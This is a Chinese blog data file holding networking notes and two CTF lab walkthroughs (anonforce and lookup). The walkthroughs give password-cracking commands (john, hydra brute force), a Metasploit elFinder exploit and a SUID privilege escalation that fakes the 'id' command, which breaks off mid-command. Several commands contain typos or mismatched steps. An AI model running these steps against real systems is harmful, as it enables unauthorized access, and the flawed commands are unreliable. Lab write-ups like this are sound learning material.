title=\"网络层\"></a>网络层</h3><p>实际的传输功能就在网络层</p>\n<p>网络层是<strong>互联网通信过程</strong>的一部分，这是连接发生的地方，在不同网络之间来回<strong>发送数据包</strong>来进行通信，处理不同网络之间的数据路由和发送。</p>\n<p>用于将接收到的数据段从一台计算机传输到位于不同网络中的另一台计算机。</p>\n<p>第三层的数据单元为<strong>数据包</strong></p>\n<h4 id=\"功能-1\"><a href=\"#功能-1\" class=\"headerlink\" title=\"功能\"></a>功能</h4><ol>\n<li>寻址<br>对网络层而言使用IP地址来<strong>唯一标识</strong>互联网上的各个寻址，网络层依靠IP地址进行<strong>相互通信</strong>（类似于MAC地址），详细的编址方案参见IPv4和IPv6。<br></li>\n<li>路由<br>在同一个网络中的内部通信并不需要网络层设备，仅仅靠数据链路层就可以完成相互通信，对于不同的网络之间相互通信则必须借助路由器等三层设备。</li>\n</ol>\n<h4 id=\"网络层协议\"><a href=\"#网络层协议\" class=\"headerlink\" title=\"网络层协议\"></a>网络层协议</h4><ul>\n<li>IP （V4、V6）</li>\n<li>ICMP（V4、V6）</li>\n<li>IPsec</li>\n<li>RIP</li>\n<li>OSPF</li>\n</ul>\n<h4 id=\"ip协议\"><a href=\"#ip协议\" class=\"headerlink\" title=\"ip协议\"></a>ip协议</h4><p>网络层最常使用这个协议。IP 协议会将传输层的报文作为数据部分，再加上 IP 包头组装成 IP 报文，如果 IP 报文大小超过 MTU（最大传输单元。以太网中一般为 1500 字节）就会再次进行分片，得到一个即将发送到网络的 IP 报文。</p>\n<h4 id=\"组成\"><a href=\"#组成\" class=\"headerlink\" title=\"组成\"></a>组成</h4><ul>\n<li>主机号</li>\n<li>网络号</li>\n</ul>\n<h4 id=\"具有网络层功能的设备\"><a href=\"#具有网络层功能的设备\" class=\"headerlink\" title=\"具有网络层功能的设备\"></a>具有网络层功能的设备</h4><ul>\n<li>路由</li>\n<li>三层交换机</li>\n</ul>\n<h3 id=\"传输层\"><a href=\"#传输层\" class=\"headerlink\" title=\"传输层\"></a>传输层</h3><p>传输层并不负责将数据从一个设备传输到另一个设备 是作为数据传输的一个媒介 帮助应用到应用的通信</p>\n<p>传输层通过分段、流量控制和差错控制来控制通信的可靠性。支持不同主机上运行的应用程序之间的端到端通信。</p>\n<p>第四次的数据单元可以说<strong>报文段</strong>或<strong>数据段</strong>(<strong>tcp</strong>)和<strong>数据报</strong>(<strong>udp</strong>)</p>\n<h4 id=\"协议-1\"><a href=\"#协议-1\" class=\"headerlink\" title=\"协议\"></a>协议</h4><ul>\n<li>tcp</li>\n<li>udp</li>\n</ul>\n<p>tcp比udp多出很多特征 流量控制，超时重传等</p>\n<p>传输层的数据包超过tcp最大报文段长度，就要将数据包分段 称之为tcp segment(tcp段)</p>\n<h3 id=\"会话层\"><a href=\"#会话层\" class=\"headerlink\" title=\"会话层\"></a>会话层</h3><p>主要利用传输层提供的端到端数据传输服务，为两个会话层实体进行<strong>会话</strong>（Session），而进行的对话连接的管理服务。</p>\n<h4 id=\"会话层服务\"><a href=\"#会话层服务\" class=\"headerlink\" title=\"会话层服务\"></a>会话层服务</h4><ul>\n<li>认证</li>\n<li>权限</li>\n<li>会话恢复</li>\n</ul>\n<h4 id=\"会话层协议\"><a href=\"#会话层协议\" class=\"headerlink\" title=\"会话层协议\"></a>会话层协议</h4><ul>\n<li>PAP, 密码认证协议</li>\n<li>PPTP, 点对点隧道协议</li>\n<li>L2TP, 第二层隧道协议</li>\n<li>RPC, 远程过程调用</li>\n<li>SDP, 套接字直接协议</li>\n</ul>\n<h3 id=\"表示层\"><a href=\"#表示层\" class=\"headerlink\" title=\"表示层\"></a>表示层</h3><p>表示层向上对应用层服务，向下接受来自会话层的服务。表示层为在应用过程之间传送的信息提供表示方法的服务，它只关心信息发出的语法和语义</p>\n<p>表示层从应用层接收数据。这些数据是以字符和数字的形式出现的，表示层将这些字符和数字转换成机器可理解的二进制格式。</p>\n<p>为不同终端的上层用户提供数据和信息正确的语法表示变换方法。表示层确保数据以应用层可以理解的形式传递。处理数据编码、压缩和加密。</p>\n<h4 id=\"表示层的主要功能\"><a href=\"#表示层的主要功能\" class=\"headerlink\" title=\"表示层的主要功能\"></a>表示层的主要功能</h4><ul>\n<li>数据语法转换</li>\n<li>语法表示</li>\n<li>连接管理</li>\n<li>数据处理</li>\n<li>数据加密和解密</li>\n<li>数据压缩和解压</li>\n<li>数据编码和解码</li>\n</ul>\n<h4 id=\"表示层协议\"><a href=\"#表示层协议\" class=\"headerlink\" title=\"表示层协议\"></a>表示层协议</h4><ul>\n<li>HTTP&#x2F;HTTPS</li>\n<li>FTP&#x2F;FTPS</li>\n<li>SSH</li>\n<li>Telnet</li>\n<li>ASN.1</li>\n</ul>\n<h3 id=\"应用层\"><a href=\"#应用层\" class=\"headerlink\" title=\"应用层\"></a>应用层</h3><p>最上面的一层 应用层。电脑手机使用的应用程序就是在应用层实现的。应用层不关心数据的传输</p>\n<p>用层直接和应用程序接口结合，并提供常见的网络应用服务。应用层也向第六层表示层发出请求。</p>\n<p>应用层直接向最终用户应用程序提供网络服务。</p>\n<h4 id=\"协议-2\"><a href=\"#协议-2\" class=\"headerlink\" title=\"协议\"></a>协议</h4><ul>\n<li>DHCP</li>\n<li>DNS</li>\n<li>FTP</li>\n<li>POP3</li>\n<li>http</li>\n<li>ftp</li>\n<li>smtp<br>简单来说 假如你在给你的异地女朋友发微信信息 微信这个app就是属于<strong>应用层</strong> 将你发的这个信息转化为机器<strong>能够懂的适合传输</strong>的形式 这个就是<strong>表示层</strong>的作用 这个信息要发给你的女朋友 你和女朋友的微信会创建一个<strong>会话连接</strong> 会话层会在信息发过去的时候<strong>保证传输</strong>顺利进行 传输层会把数据<strong>分成</strong>适合传输的<strong>数据包</strong>进行传输 网络层会规划一条<strong>合适的路径</strong>传输信息 数据链路层会通过物理网络将<strong>数据包传给</strong>物理层 物理层就能把数据包发送到接收方手机 就能接收到发送方的信息</li>\n</ul>\n<h2 id=\"tcp-ip模型\"><a href=\"#tcp-ip模型\" class=\"headerlink\" title=\"tcp&#x2F;ip模型\"></a>tcp&#x2F;ip模型</h2><ul>\n<li>应用层</li>\n<li>传输层</li>\n<li>网络接口层</li>\n<li>链路层</li>\n</ul>\n<h2 id=\"端口\"><a href=\"#端口\" class=\"headerlink\" title=\"端口\"></a>端口</h2><p>一个是物理端口 一个是逻辑端口</p>\n<p>物理端口是用于连接物理设备之间的接口，如ADSL Modem、集线器、交换机、路由器上用于连接其他网络设备的接口，如RJ-45端口、SC端口等等。</p>\n<p>逻辑端口是指逻辑意义上用于区分服务的端口，比如用于浏览网页服务的80端口，用于FTP服务的21端口等。如TCP&#x2F;IP协议中的服务端口，通过不同的逻辑端口来区分不同的服务。</p>\n<p>最多可以有65536个端口 。端口是通过端口号来标记的，端口号只有整数，范围是从0 到65535 。</p>\n<p>说白了 端口可以简单理解为门牌号 特定服务或者特定应用的门牌号 外界互联网来的消息，数据包可以通过端口到达指定的应用或者服务</p>\n<h3 id=\"周知端口\"><a href=\"#周知端口\" class=\"headerlink\" title=\"周知端口\"></a>周知端口</h3><p>0-1023 周知端口</p>\n<h3 id=\"动态端口\"><a href=\"#动态端口\" class=\"headerlink\" title=\"动态端口\"></a>动态端口</h3><p>1024-65535 动态端口</p>\n<h2 id=\"ip地址\"><a href=\"#ip地址\" class=\"headerlink\" title=\"ip地址\"></a>ip地址</h2><p>由网络号和主机号组成</p>\n<p>A类地址以0开头，第一个字节作为网络号，地址范围为：0.0.0.0~127.255.255.255</p>\n<p>B类地址以10开头，前两个字节作为网络号，地址范围是：128.0.0.0~191.255.255.255</p>\n<p>C类地址以110开头，前三个字节作为网络号，地址范围是：192.0.0.0~223.255.255.255</p>\n<p>D类地址以1110开头，地址范围是224.0.0.0~239.255.255.255，D类地址作为组播地址（一对多的通信）</p>\n<p>E类地址以1111开头，地址范围是240.0.0.0~255.255.255.255，E类地址为保留地址，供以后使用。</p>\n<p>0.0.0.0用来寻找自己的ip</p>\n<h3 id=\"私有地址\"><a href=\"#私有地址\" class=\"headerlink\" title=\"私有地址\"></a>私有地址</h3><ul>\n<li>A类 10.0.0.0 - 10.255.255.255 (10&#x2F;8)</li>\n<li>B类 172.16.0.0 - 172.31.255.255 (172.16&#x2F;12)</li>\n<li>C类 192.168.0.0 - 192.168.255.255 (192.168&#x2F;16)</li>\n</ul>\n<h2 id=\"dhcp协议\"><a href=\"#dhcp协议\" class=\"headerlink\" title=\"dhcp协议\"></a>dhcp协议</h2><p>动态主机配置协议 用于集中对用户IP地址进行动态管理和配置。</p>\n<h3 id=\"DHCP遵循四个步骤：发现、提供、请求和确认-DORA-：\"><a href=\"#DHCP遵循四个步骤：发现、提供、请求和确认-DORA-：\" class=\"headerlink\" title=\"DHCP遵循四个步骤：发现、提供、请求和确认 (DORA)：\"></a>DHCP遵循四个步骤：发现、提供、请求和确认 (DORA)：</h3><ul>\n<li>DHCP发现：客户端将广播 DHCPDISCOVER 消息，寻找本地DHCP服务器（如果存在）。</li>\n<li>DHCP提供：服务器以 DHCPOFFER 消息进行响应，其中包含可供客户端接受的 IP 地址。</li>\n<li>DHCP请求：客户端以 DHCPREQUEST 消息进行响应，表明它已接受提供的 IP。</li>\n<li>DHCP确认：服务器以 DHCPACK 消息进行响应，以确认提供的 IP 地址现已分配给该客户端。</li>\n</ul>\n<h2 id=\"arp协议\"><a href=\"#arp协议\" class=\"headerlink\" title=\"arp协议\"></a>arp协议</h2><p>arp协议(地址解析协议) IP地址对mac地址的映射 询问IP地址对应的mac地址</p>\n<p>目标 MAC 地址<br>源 MAC 地址</p>\n"},{"title":"anonforce教程","date":"2025-01-19T12:08:53.000Z","top_img":"transparent","cover":"https://s2.loli.net/2025/01/19/5xdkvTe8SKujhqn.png","_content":"我们开始第一次的ctf的测试 练练手 我们开始搞这个anonforce\n\n![title](/images/anonforce/title.png)\n\n## 1.nmap扫描\n首先nmap扫描一波\n\n```\nnmap -sS -sV -A ip\n```\n\n![nmap](/images/anonforce/nmap1.png)\n\n![nmap](/images/anonforce/nmap2.png)\n\n\n## 2.ftp服务器里面搞东西\n我们会发现扫出来两个端口 **21 ftp端口**和**22 openssh端口**\n而ftp端口我们可以匿名登录 用户名就是anonymous 密码随意 \n\n![ftp](/images/anonforce/ftplogin.png)\n\n我们成功登录进去了\n\n\nls查看一下有啥文件 发现一个notread的文件 \n\n![ftp](/images/anonforce/ftplook.png)\n\n进去看看有啥东西吗\n\n![ftp](/images/anonforce/ftpcd.png)\n\n可以使用**get 文件名**来下载或者是<strong>mget *</strong>\n我用mget * 还挺方便的一次性下载好\n\n![ftp](/images/anonforce/mget.png)\n\n接着我们在ftp里面再找找还有啥线索吗 其实我是看了教程才知道user.txt在该死的/home里面 直接进去就可以搞到第一题答案 下次遇到这种先进去看看\n\n![ftp](/images/anonforce/home.png)\n\n## 3.破解文件\n其实这个就是最难的 本身也没接触过这个破解的工具\n现在咱把ftp服务器退了 我们来看一下我们下载的东西 分别是**backup.pgp**和**private.asc** 这两个是关键\n### 第一步\n我们要先把private.asc搞出来 \n\n```\ngp2john /root/private.asc > /root/hash_for_john\n```\n\n这个命令是将**加密信息**转换为 John the Ripper **可以识别的哈希格式**\n\n后面两个其实就是自己的文件的路径就行 不是一定要上面这个 \n\n![po](/images/anonforce/john.png)\n\n### 第二步\n我们把刚才搞好的john_for_hash这个文件拉到john里面去破解\n\n```\njohn hash_for_john\n```\n![john](/images/anonforce/johnhaxi.png)\n\n我们能得出密码是xbox360\n\n## 第三步\n导入私钥 将我们得到的密码xobx360输进去\n\n```\ngpg --import private.asc\n```\n\n![daoru](/images/anonforce/import.png)\n\n### 第四步\n解密backup.pgp \n\n```\njohn hash --wordlist=/usr/share/wordlists/rockyou.txt\n```\n\n![jiemi](/images/anonforce/jieimi.png)\n\n### 第五步\n解密之后我们会发现 这个有点貌似是**shadow**文件 存储着密码\n\n![mima](/images/anonforce/pgp.png)\n\n我们将root的密码复制出来 粘贴到一个新建的文本文件里面 然后用john去破解 就可以得到密码是hikari\n\n```\njohn hash --wordlist=/usr/share/wordlists/rockyou.txt\n```\n\n![root](images/anonforce/jieimi.png)\n\n### 最后一步 \n得到了root的密码 我们直接ssh连接 连接成果之后 root.txt就静静地等着你的到来\n\n```\nssh root@ip\n```\n![ssh](/images/anonforce/root.png)\n\n这个难的地方就是 我没接触过John the Ripper 虽然略有所谓 但是没实战操作过 有些地方不太熟悉 特别是转换为john可以识别的格式和用john解密。挺好的机会去学习这个工具\n\n\n\n\n","source":"_posts/anonforce教程.md","raw":"---\ntitle: anonforce教程\ndate: 2025-01-19 20:08:53\ntags: ctf linux 密码破解\ntop_img: transparent\ncover: https://s2.loli.net/2025/01/19/5xdkvTe8SKujhqn.png\n---\n我们开始第一次的ctf的测试 练练手 我们开始搞这个anonforce\n\n![title](/images/anonforce/title.png)\n\n## 1.nmap扫描\n首先nmap扫描一波\n\n```\nnmap -sS -sV -A ip\n```\n\n![nmap](/images/anonforce/nmap1.png)\n\n![nmap](/images/anonforce/nmap2.png)\n\n\n## 2.ftp服务器里面搞东西\n我们会发现扫出来两个端口 **21 ftp端口**和**22 openssh端口**\n而ftp端口我们可以匿名登录 用户名就是anonymous 密码随意 \n\n![ftp](/images/anonforce/ftplogin.png)\n\n我们成功登录进去了\n\n\nls查看一下有啥文件 发现一个notread的文件 \n\n![ftp](/images/anonforce/ftplook.png)\n\n进去看看有啥东西吗\n\n![ftp](/images/anonforce/ftpcd.png)\n\n可以使用**get 文件名**来下载或者是<strong>mget *</strong>\n我用mget * 还挺方便的一次性下载好\n\n![ftp](/images/anonforce/mget.png)\n\n接着我们在ftp里面再找找还有啥线索吗 其实我是看了教程才知道user.txt在该死的/home里面 直接进去就可以搞到第一题答案 下次遇到这种先进去看看\n\n![ftp](/images/anonforce/home.png)\n\n## 3.破解文件\n其实这个就是最难的 本身也没接触过这个破解的工具\n现在咱把ftp服务器退了 我们来看一下我们下载的东西 分别是**backup.pgp**和**private.asc** 这两个是关键\n### 第一步\n我们要先把private.asc搞出来 \n\n```\ngp2john /root/private.asc > /root/hash_for_john\n```\n\n这个命令是将**加密信息**转换为 John the Ripper **可以识别的哈希格式**\n\n后面两个其实就是自己的文件的路径就行 不是一定要上面这个 \n\n![po](/images/anonforce/john.png)\n\n### 第二步\n我们把刚才搞好的john_for_hash这个文件拉到john里面去破解\n\n```\njohn hash_for_john\n```\n![john](/images/anonforce/johnhaxi.png)\n\n我们能得出密码是xbox360\n\n## 第三步\n导入私钥 将我们得到的密码xobx360输进去\n\n```\ngpg --import private.asc\n```\n\n![daoru](/images/anonforce/import.png)\n\n### 第四步\n解密backup.pgp \n\n```\njohn hash --wordlist=/usr/share/wordlists/rockyou.txt\n```\n\n![jiemi](/images/anonforce/jieimi.png)\n\n### 第五步\n解密之后我们会发现 这个有点貌似是**shadow**文件 存储着密码\n\n![mima](/images/anonforce/pgp.png)\n\n我们将root的密码复制出来 粘贴到一个新建的文本文件里面 然后用john去破解 就可以得到密码是hikari\n\n```\njohn hash --wordlist=/usr/share/wordlists/rockyou.txt\n```\n\n![root](images/anonforce/jieimi.png)\n\n### 最后一步 \n得到了root的密码 我们直接ssh连接 连接成果之后 root.txt就静静地等着你的到来\n\n```\nssh root@ip\n```\n![ssh](/images/anonforce/root.png)\n\n这个难的地方就是 我没接触过John the Ripper 虽然略有所谓 但是没实战操作过 有些地方不太熟悉 特别是转换为john可以识别的格式和用john解密。挺好的机会去学习这个工具\n\n\n\n\n","slug":"anonforce教程","published":1,"updated":"2025-01-20T10:23:17.702Z","comments":1,"layout":"post","photos":[],"_id":"cm74njvxf000jtsg624p67s4h","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><p>我们开始第一次的ctf的测试 练练手 我们开始搞这个anonforce</p>\n<p><img src=\"/images/anonforce/title.png\" alt=\"title\"></p>\n<h2 id=\"1-nmap扫描\"><a href=\"#1-nmap扫描\" class=\"headerlink\" title=\"1.nmap扫描\"></a>1.nmap扫描</h2><p>首先nmap扫描一波</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sS -sV -A ip</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/anonforce/nmap1.png\" alt=\"nmap\"></p>\n<p><img src=\"/images/anonforce/nmap2.png\" alt=\"nmap\"></p>\n<h2 id=\"2-ftp服务器里面搞东西\"><a href=\"#2-ftp服务器里面搞东西\" class=\"headerlink\" title=\"2.ftp服务器里面搞东西\"></a>2.ftp服务器里面搞东西</h2><p>我们会发现扫出来两个端口 <strong>21 ftp端口</strong>和<strong>22 openssh端口</strong><br>而ftp端口我们可以匿名登录 用户名就是anonymous 密码随意 </p>\n<p><img src=\"/images/anonforce/ftplogin.png\" alt=\"ftp\"></p>\n<p>我们成功登录进去了</p>\n<p>ls查看一下有啥文件 发现一个notread的文件 </p>\n<p><img src=\"/images/anonforce/ftplook.png\" alt=\"ftp\"></p>\n<p>进去看看有啥东西吗</p>\n<p><img src=\"/images/anonforce/ftpcd.png\" alt=\"ftp\"></p>\n<p>可以使用<strong>get 文件名</strong>来下载或者是<strong>mget *</strong><br>我用mget * 还挺方便的一次性下载好</p>\n<p><img src=\"/images/anonforce/mget.png\" alt=\"ftp\"></p>\n<p>接着我们在ftp里面再找找还有啥线索吗 其实我是看了教程才知道user.txt在该死的&#x2F;home里面 直接进去就可以搞到第一题答案 下次遇到这种先进去看看</p>\n<p><img src=\"/images/anonforce/home.png\" alt=\"ftp\"></p>\n<h2 id=\"3-破解文件\"><a href=\"#3-破解文件\" class=\"headerlink\" title=\"3.破解文件\"></a>3.破解文件</h2><p>其实这个就是最难的 本身也没接触过这个破解的工具<br>现在咱把ftp服务器退了 我们来看一下我们下载的东西 分别是<strong>backup.pgp</strong>和<strong>private.asc</strong> 这两个是关键</p>\n<h3 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h3><p>我们要先把private.asc搞出来 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gp2john /root/private.asc &gt; /root/hash_for_john</span><br></pre></td></tr></table></figure>\n\n<p>这个命令是将<strong>加密信息</strong>转换为 John the Ripper <strong>可以识别的哈希格式</strong></p>\n<p>后面两个其实就是自己的文件的路径就行 不是一定要上面这个 </p>\n<p><img src=\"/images/anonforce/john.png\" alt=\"po\"></p>\n<h3 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h3><p>我们把刚才搞好的john_for_hash这个文件拉到john里面去破解</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">john hash_for_john</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/anonforce/johnhaxi.png\" alt=\"john\"></p>\n<p>我们能得出密码是xbox360</p>\n<h2 id=\"第三步\"><a href=\"#第三步\" class=\"headerlink\" title=\"第三步\"></a>第三步</h2><p>导入私钥 将我们得到的密码xobx360输进去</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gpg --import private.asc</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/anonforce/import.png\" alt=\"daoru\"></p>\n<h3 id=\"第四步\"><a href=\"#第四步\" class=\"headerlink\" title=\"第四步\"></a>第四步</h3><p>解密backup.pgp </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">john hash --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/anonforce/jieimi.png\" alt=\"jiemi\"></p>\n<h3 id=\"第五步\"><a href=\"#第五步\" class=\"headerlink\" title=\"第五步\"></a>第五步</h3><p>解密之后我们会发现 这个有点貌似是<strong>shadow</strong>文件 存储着密码</p>\n<p><img src=\"/images/anonforce/pgp.png\" alt=\"mima\"></p>\n<p>我们将root的密码复制出来 粘贴到一个新建的文本文件里面 然后用john去破解 就可以得到密码是hikari</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">john hash --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/anonforce/jieimi.png\" alt=\"root\"></p>\n<h3 id=\"最后一步\"><a href=\"#最后一步\" class=\"headerlink\" title=\"最后一步\"></a>最后一步</h3><p>得到了root的密码 我们直接ssh连接 连接成果之后 root.txt就静静地等着你的到来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh root@ip</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/anonforce/root.png\" alt=\"ssh\"></p>\n<p>这个难的地方就是 我没接触过John the Ripper 虽然略有所谓 但是没实战操作过 有些地方不太熟悉 特别是转换为john可以识别的格式和用john解密。挺好的机会去学习这个工具</p>\n","excerpt":"","more":"<p>我们开始第一次的ctf的测试 练练手 我们开始搞这个anonforce</p>\n<p><img src=\"/images/anonforce/title.png\" alt=\"title\"></p>\n<h2 id=\"1-nmap扫描\"><a href=\"#1-nmap扫描\" class=\"headerlink\" title=\"1.nmap扫描\"></a>1.nmap扫描</h2><p>首先nmap扫描一波</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sS -sV -A ip</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/anonforce/nmap1.png\" alt=\"nmap\"></p>\n<p><img src=\"/images/anonforce/nmap2.png\" alt=\"nmap\"></p>\n<h2 id=\"2-ftp服务器里面搞东西\"><a href=\"#2-ftp服务器里面搞东西\" class=\"headerlink\" title=\"2.ftp服务器里面搞东西\"></a>2.ftp服务器里面搞东西</h2><p>我们会发现扫出来两个端口 <strong>21 ftp端口</strong>和<strong>22 openssh端口</strong><br>而ftp端口我们可以匿名登录 用户名就是anonymous 密码随意 </p>\n<p><img src=\"/images/anonforce/ftplogin.png\" alt=\"ftp\"></p>\n<p>我们成功登录进去了</p>\n<p>ls查看一下有啥文件 发现一个notread的文件 </p>\n<p><img src=\"/images/anonforce/ftplook.png\" alt=\"ftp\"></p>\n<p>进去看看有啥东西吗</p>\n<p><img src=\"/images/anonforce/ftpcd.png\" alt=\"ftp\"></p>\n<p>可以使用<strong>get 文件名</strong>来下载或者是<strong>mget *</strong><br>我用mget * 还挺方便的一次性下载好</p>\n<p><img src=\"/images/anonforce/mget.png\" alt=\"ftp\"></p>\n<p>接着我们在ftp里面再找找还有啥线索吗 其实我是看了教程才知道user.txt在该死的&#x2F;home里面 直接进去就可以搞到第一题答案 下次遇到这种先进去看看</p>\n<p><img src=\"/images/anonforce/home.png\" alt=\"ftp\"></p>\n<h2 id=\"3-破解文件\"><a href=\"#3-破解文件\" class=\"headerlink\" title=\"3.破解文件\"></a>3.破解文件</h2><p>其实这个就是最难的 本身也没接触过这个破解的工具<br>现在咱把ftp服务器退了 我们来看一下我们下载的东西 分别是<strong>backup.pgp</strong>和<strong>private.asc</strong> 这两个是关键</p>\n<h3 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h3><p>我们要先把private.asc搞出来 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gp2john /root/private.asc &gt; /root/hash_for_john</span><br></pre></td></tr></table></figure>\n\n<p>这个命令是将<strong>加密信息</strong>转换为 John the Ripper <strong>可以识别的哈希格式</strong></p>\n<p>后面两个其实就是自己的文件的路径就行 不是一定要上面这个 </p>\n<p><img src=\"/images/anonforce/john.png\" alt=\"po\"></p>\n<h3 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h3><p>我们把刚才搞好的john_for_hash这个文件拉到john里面去破解</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">john hash_for_john</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/anonforce/johnhaxi.png\" alt=\"john\"></p>\n<p>我们能得出密码是xbox360</p>\n<h2 id=\"第三步\"><a href=\"#第三步\" class=\"headerlink\" title=\"第三步\"></a>第三步</h2><p>导入私钥 将我们得到的密码xobx360输进去</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gpg --import private.asc</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/anonforce/import.png\" alt=\"daoru\"></p>\n<h3 id=\"第四步\"><a href=\"#第四步\" class=\"headerlink\" title=\"第四步\"></a>第四步</h3><p>解密backup.pgp </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">john hash --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/anonforce/jieimi.png\" alt=\"jiemi\"></p>\n<h3 id=\"第五步\"><a href=\"#第五步\" class=\"headerlink\" title=\"第五步\"></a>第五步</h3><p>解密之后我们会发现 这个有点貌似是<strong>shadow</strong>文件 存储着密码</p>\n<p><img src=\"/images/anonforce/pgp.png\" alt=\"mima\"></p>\n<p>我们将root的密码复制出来 粘贴到一个新建的文本文件里面 然后用john去破解 就可以得到密码是hikari</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">john hash --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/anonforce/jieimi.png\" alt=\"root\"></p>\n<h3 id=\"最后一步\"><a href=\"#最后一步\" class=\"headerlink\" title=\"最后一步\"></a>最后一步</h3><p>得到了root的密码 我们直接ssh连接 连接成果之后 root.txt就静静地等着你的到来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh root@ip</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/anonforce/root.png\" alt=\"ssh\"></p>\n<p>这个难的地方就是 我没接触过John the Ripper 虽然略有所谓 但是没实战操作过 有些地方不太熟悉 特别是转换为john可以识别的格式和用john解密。挺好的机会去学习这个工具</p>\n"},{"title":"lookup 教程","date":"2025-01-31T11:07:31.000Z","top_img":"transparent","cover":"https://s2.loli.net/2025/02/01/21dnkp68VGWhuQD.jpg","_content":"# lookup 教程\n![lookup](/images/lookup-教程/head.png)\n\n这次来了个lookup 话不多说 直接看题\n\n![lookup](/images/lookup-教程/title.png)\n\n## 第一步\n我们还是绑一下域名 就是在/etc/hosts里面输你的机器ip 加lookup.thm\n\n这个就不上图了 记得顺便把file.lookup.thm也绑一下hosts 不然等下登录进去就会发现登不进去\n\n![file](/images/lookup-教程/fail.png)\n\n## 第二步\n我们访问lookup.thm 发现是个登录界面 先随便输几个试试水 经过发现会有两个提示 第一个是密码错误 第二个是密码和账户都错误 用hydra来搞一下 看看能破解出来吗 \n\n```\nhydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form  \"/login.php:username=^USER^&password=^PASS^:Wrong Password. Please try again\"\n\nhydra -L /usr/share/wordlists/rockyou.txt -p password123 lookup.thm http-post-form  -vV \"/login.php:username=^USER^&password=^PASS^:Wrong username or password. Please try again.\"\n```\n\n通过第一个代码 能够爆出密码是晒 第二个代码可以把账户名也搞出来\n\n![hydra](/images/lookup-教程/password.png)\n\n![hydra](/images/lookup-教程/password2.png)\n\n## 第三步\n破解出密码之后 我们登录进去看看怎么个事 发现是个类似文件夹的管理系统 文件基本上都是上锁了 看看没解锁的文件有啥提示吗 \n\n![lock](/images/lookup-教程/file1.png)\n\n好吧 也没提示啥 偶然发现了这个文件夹是elfinder 版本号也知道 搜一下看有漏洞吗 发现是有的 我们打开msf 搜一下这个漏洞\n\n![lock](/images/lookup-教程/banbaen.png)\n\n![msf](/images/lookup-教程/msf.png)\n\n配置一下rhost和lhost这两个参数 一个是你要攻击的域名 一个是你本机的ip run一下 我们成功打进去了\n\n![msf](/images/lookup-教程/msf1.png)\n\n## 第四步\n这个有有点困难了 要提权 先find /--perm 4000 2>/dev/null 查看suid用户 发现一个叫pwn的用户 感觉这个是解题关键 ls查看一下详细信息 所属root \n\n```\nfind /--perm 4000 2>/dev/null \n```\n\n>/dev/null 表示将标准错误输出重定向到 /dev/null，这相当于丢弃错误信息。\n\n\n![shell](/images/lookup-教程/pwn.png)\n\n\n![shell](/images/lookup-教程/pwn2.png)\n\n输入/usr/sbin/pwm 他告诉我们提示 输入ip 会显示用户名 我们就得想办法的让他爆名字 输入id这个命令能知道用户名\n\n![shell](/images/lookup-教程/id.png)\n\n我们在/tmp中搞一个id的文本文件 id think用户 \n\n```\necho -e '#!/bin/bash\\n echo \"uid=33(think) gid=33(think) groups=33(think)\"' > 